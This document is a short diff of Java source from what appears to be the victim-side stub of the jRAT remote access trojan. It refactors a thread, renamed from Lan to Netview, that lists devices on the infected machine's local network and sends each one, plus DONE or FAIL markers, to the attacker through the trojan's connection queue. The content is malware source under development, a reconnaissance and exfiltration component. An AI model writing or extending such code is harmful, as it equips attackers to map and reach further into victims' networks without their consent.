@@ -8,7 +8,13 @@ import se.jrat.stub.packets.outgoing.Packet49LanDevices;
 import com.redpois0n.oslib.OperatingSystem;
 
 
-public class Lan extends Thread {
+public class Netview extends Thread {
+
+	private Connection con;
+	
+	public Netview(Connection con) {
+		this.con = con;
+	}
 
 	public void run() {
 		try {
@@ -32,17 +38,17 @@ public class Lan extends Thread {
 						}
 						preader.close();
 
-						Connection.instance.addToSendQueue(new Packet49LanDevices(line, ip == null ? "Unknown" : ip));
+						con.addToSendQueue(new Packet49LanDevices(line, ip == null ? "Unknown" : ip));
 					}
 				}
 				reader.close();
-				Connection.instance.addToSendQueue(new Packet49LanDevices("DONE", null));
+				con.addToSendQueue(new Packet49LanDevices("DONE", null));
 			} else {
 				throw new Exception();
 			}
 		} catch (Exception ex) {
 			ex.printStackTrace();
-			Connection.instance.addToSendQueue(new Packet49LanDevices("FAIL", null));
+			con.addToSendQueue(new Packet49LanDevices("FAIL", null));
 		}
 	}
 
